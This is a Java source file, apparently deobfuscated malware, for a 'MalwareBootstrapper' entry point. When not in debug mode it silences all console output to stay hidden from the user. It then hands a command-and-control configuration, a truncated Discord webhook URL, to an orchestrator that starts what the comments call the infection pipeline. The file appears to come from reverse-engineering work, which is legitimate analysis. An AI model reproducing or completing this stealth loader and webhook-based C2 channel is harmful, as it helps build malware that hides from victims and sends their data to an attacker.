import java.io.PrintStream;

/**
 * Cleaned MalwareBootstrapper (formerly r.java)
 * The main entry point of the application. It handles stealth startup,
 * redirects output to stay hidden, and initializes the ExecutionOrchestrator.
 */
public class MalwareBootstrapper {

    public static void main(String[] args) {
        boolean debugMode = false;

        // Check if we should run in debug mode (usually triggered by a specific flag)
        for (String arg : args) {
            if (arg.equalsIgnoreCase("-debug")) {
                debugMode = true;
            }
        }

        if (!debugMode) {
            try {
                // Redirect all console output to a "Null" stream to hide from the user
                PrintStream nullStream = new PrintStream(new SilentOutputStream());
                System.setOut(nullStream);
                System.setErr(nullStream);
            } catch (Exception ignored) {}
        }

        try {
            // Decrypted C2 Configuration or ID
            String c2Config = "https://discord.com/api/webhooks/..."; 

            // Initialize the main brain (ExecutionOrchestrator)
            // Passes the config and start the infection pipeline
            ExecutionOrchestrator orchestrator = new ExecutionOrchestrator(c2Config, !debugMode);
            orchestrator.start();

        } catch (Throwable t) {
            if (debugMode) {
                t.printStackTrace();
            }
        }
    }
}
